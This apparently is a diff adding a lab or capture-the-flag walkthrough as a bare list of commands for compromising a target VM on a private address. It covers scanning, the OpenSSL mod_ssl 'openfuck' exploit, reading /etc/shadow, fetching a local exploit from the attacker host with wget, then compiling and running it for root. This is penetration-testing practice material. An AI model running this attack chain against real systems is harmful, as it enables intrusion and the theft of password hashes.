@@ -1,0 +1,46 @@
+# Network discovery
+
+sudo netdiscover -i eth0
+
+# Port scanning
+
+sudo nmap -sS -sV -O -Pn 192.168.56.105
+
+# Web check
+
+curl http://192.168.56.105
+
+# Exploitation - OpenSSL mod_ssl
+
+./openfuck 0x6b 192.168.56.105 443 -c 40
+
+# Post-exploitation enumeration
+
+id
+whoami
+uname -a
+ls -l /etc/shadow
+cat /etc/shadow
+
+# File transfer (attacker)
+
+python3 -m http.server 8000
+
+# File transfer (target)
+
+cd /tmp
+wget http://192.168.56.101:8000/3.c
+
+# Compile local exploit
+
+gcc 3.c -o exploit
+chmod +x exploit
+
+# Privilege escalation
+
+./exploit
+
+# Proof
+
+id
+whoami
